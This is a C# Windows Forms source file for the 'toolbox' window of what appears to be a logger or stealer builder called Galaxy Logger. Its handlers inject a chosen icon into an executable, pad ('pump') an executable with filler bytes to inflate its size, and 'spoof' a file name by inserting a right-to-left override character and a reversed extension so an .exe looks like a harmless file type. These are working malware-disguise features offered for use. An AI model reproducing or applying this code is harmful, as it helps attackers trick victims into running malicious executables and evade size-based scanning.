using System;
using System.IO;
using System.Windows.Forms;

namespace Galaxy_Logger.Forms
{
    public partial class frmToolBox : Form
    {
        OpenFileDialog openFileDialog = new OpenFileDialog();
        public frmToolBox()
        {
            InitializeComponent();
        }

        private void slcClose1_Click_1(object sender, EventArgs e)
        {
            Hide();
        }

        private void slCbtn7_Click_1(object sender, EventArgs e)
        {
            if (!string.IsNullOrEmpty(slcTextBox5.Text) && !string.IsNullOrEmpty(slcTextBox6.Text))
            {
                IconInjector.InjectIcon(slcTextBox6.Text, slcTextBox5.Text);
                MessageBox.Show("Icon changed!","", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
            {
                MessageBox.Show("Invalid information!", "Wrong input", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
                
        }

        private void slCbtn6_Click_1(object sender, EventArgs e)
        {
            openFileDialog.Filter = "Executables | *.exe";
            openFileDialog.Title = "Select an executable which should be pumped";
            openFileDialog.CheckFileExists = true;
            openFileDialog.ShowDialog();
            slcTextBox6.Text = openFileDialog.FileName;
        }

        private void slCbtn5_Click_1(object sender, EventArgs e)
        {
            openFileDialog.Filter = "Icon | *.ico";
            openFileDialog.Title = "Select an icon.";
            openFileDialog.CheckFileExists = true;
            openFileDialog.ShowDialog();
            slcTextBox5.Text = openFileDialog.FileName;
        }

        private void slCbtn2_Click_1(object sender, EventArgs e)
        {

            string sizestr = slcTextBox2.Text;
            int size = 0;
            if (!int.TryParse(sizestr, out size))
            {
                MessageBox.Show("Please enter a valid numerical value for the size!", "Wrong input", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
          

            if (File.Exists(openFileDialog.FileName))
            {
                string newd = "";
                for (int i = 0; i < size; i++)
                    newd += "A";
                File.AppendAllText(openFileDialog.FileName, newd);
            }
            else
                MessageBox.Show("File couldn' be opened!", "File is missing", MessageBoxButtons.OK, MessageBoxIcon.Error);
            MessageBox.Show("File succesfully pumped!", "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void slCbtn1_Click_1(object sender, EventArgs e)
        {
            openFileDialog.Filter = "Executables | *.exe";
            openFileDialog.Title = "Select an executable which should be pumped";
            openFileDialog.CheckFileExists = true;
            openFileDialog.ShowDialog();
            slcTextBox1.Text = openFileDialog.FileName;
        }

        private void slCbtn4_Click_1(object sender, EventArgs e)
        {
            openFileDialog.Filter = "Executables | *.exe";
            openFileDialog.Title = "Select an executable which should be pumped";
            openFileDialog.CheckFileExists = true;
            openFileDialog.ShowDialog();
            slcTextBox4.Text = openFileDialog.FileName;
        }

        private void slCbtn3_Click_1(object sender, EventArgs e)
        {
            string extstr = slcTextBox3.Text;
            if (extstr == "")
            {
                MessageBox.Show("Please enter a valid value for the extension!", "Wrong input", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            if (File.Exists(openFileDialog.FileName))
            {
                string Filename = openFileDialog.FileName;
                int i = checked(Filename.Length - 4);
                char ch = '\x202E';
                char[] chArr = extstr.ToCharArray();
                Array.Reverse(chArr);
                string s = Filename.Substring(0, i) + ch.ToString() + (new String(chArr)) + Filename.Substring(i);
                File.Copy(Filename, s);
            }
            else
                MessageBox.Show("File couldn' be opened!", "File is missing", MessageBoxButtons.OK, MessageBoxIcon.Error);
            MessageBox.Show("File succesfully spoofed!", "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
    }
}
